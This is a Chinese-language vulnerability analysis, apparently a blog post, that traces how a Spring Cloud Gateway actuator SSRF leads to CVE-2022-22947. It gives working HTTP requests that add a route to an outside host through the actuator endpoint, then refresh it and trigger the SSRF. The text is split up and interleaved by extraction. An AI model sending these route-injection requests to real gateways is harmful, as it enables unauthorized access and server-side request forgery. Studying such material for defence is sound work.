从SSRF 到 RCE —— 对 Spring Cloud Gateway
RCE漏洞的分析
0x01 写在前⾯
本周⼆（3.1）的时候Spring官⽅发布了 Spring Cloud Gateway CVE 报告
其中编号为 CVE-2022-22947 Spring Cloud Gateway 代码注⼊漏洞的严重性为危急，周三周四的时候就有不少圈
内的朋友发了分析和复现过程，由于在⼯作和写论⽂，就⼀直没去跟踪看看，周末抽了点时间对这个漏洞进⾏复现
分析了⼀下。还是挺有意思的。
0x02 从SSRF说起
看到这个漏洞利⽤流程的时候，就有⼀种熟悉的既视感，回去翻了翻陈师傅的星球，果然：
去年12⽉的时候，陈师傅提了⼀个 actuator gateway 的 SSRF漏洞，这个漏洞来⾃ wya
作者在⽂章中提到，通过Spring Cloud Gateway 执⾏器（actuator）提供的管理功能就可以对路由进⾏添加、删
除等操作。
因此作者利⽤ actuator 提供的路由添加功能，并根据官⽅示例，如下图：
添加了⼀个路由：
POST /actuator/gateway/routes/new_route HTTP/1.1
Host: 127.0.0.1:9000
Connection: close
Content-Type: application/json
{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new_route/**"
在执⾏ refresh  操作后，作者成功执⾏了⼀个SSRF请求（向https://wya.pl/index.php发起的请求）：
陈师傅最后还在星球⾥给了个演示的实例：https://github.com/API-Security/APISandbox/blob/main/OASystem/
README.md
先不具体讨论为什么payload会这样写，如果你熟悉 CVE-2022-22947 的payload，那么看到这⾥你⼀定会有同样
的熟悉感。
是的，CVE-2022-22947 这个漏洞实际上就是这个 SSRF 的进阶版，并且触发SSRF的原理并不复杂
⾸先利⽤ /actuator/gateway/routes/{new route} 的⽅式指定⼀个URL地址，并针对该地址添加⼀个路由
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "/new_route(?.*)",
        "_genkey_1": "/${path}"
      }
    }
  ],
  "uri": "https://wya.pl",
  "order": 0
}
POST /actuator/gateway/routes/new_route HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Content-Type: application/json
{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/new_route/**"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "/new_route(?.*)",
        "_genkey_1": "/${path}"
然后刷新令这个路由⽣效：
最后直接访问 /new_route/index.php 即可触发SSRF漏洞。
到这⾥有两个问题：第⼀，payload为什么会这样写？第⼆，整个请求流程是什么样的？
⾸先来看第⼀个问题，payload为什么会这样写
上⽂中我们提到了Spring Cloud Gateway官⽅给的实例如下：
这实例对⽐⼀下SSRF的payload，我们可以发现，在SSRF的payload中多了对过滤器（filters）的具体定义。
⽽纵观整个payload，实际上可以发现，其就是⼀个动态路由的配置过程。
      }
    }
  ],
  "uri": "https://www.cnpanda.net",
  "order": 0
}
POST /actuator/gateway/routes/new_route HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Content-Type: application/json
{
  "predicate": "Paths: [/new_route], match trailing slash: true",
  "route_id": "new_route",
  "filters": [
    "[[RewritePath /new_route(?.*) = /${path}], order = 1]"
  ],
  "uri": "https://www.cnpanda.net",
  "order": 0
}
{
  "id": "first_route",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0":"/first"}
  }],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
在Spring Cloud Gateway中，路由的配置分为静态配置和动态配置，对于静态配置⽽⾔，⼀旦要添加、修改或者删
除内存中的路由配置和规则，就必须重启才可以。但在现实⽣产环境中，使⽤ Spring Cloud Gateway 都是作为所
有流量的⼊⼝，为了保证系统的⾼可⽤性，需要尽量避免系统的重启，因⽽⼀般情况下，Spring Cloud Gateway使
⽤的都是动态路由。
Spring Cloud Gateway 配置动态路由的⽅式有两种，第⼀种就是⽐较常⻅的，通过重写代码，实现⼀套动态路由
⽅法，如这⾥就有⼀个动态路由的配置过程。第⼆种就是上⽂中SSRF这种⽅式，但是这种⽅式是基于jvm内存实
现，⼀旦服务重启，新增的路由配置信息就是完全消失了。这也是P师傅在v2ex上回答的原理
所以其实payload就是⽐较固定的格式，⾸先定义⼀个谓词（predicates），⽤来匹配来⾃⽤户的请求，然后再增
加⼀个内置或⾃定义的过滤器（filters），⽤于执⾏额外的功能逻辑。
payload中我们⽤的是重写路径过滤器（RewritePath），类似的还有设置路径过滤器（SetPath）、去掉URL前缀
过滤器（StripPrefix）等，具体可以参考gateway内置的filter这张图：
以及gateway内置的Global Filter图：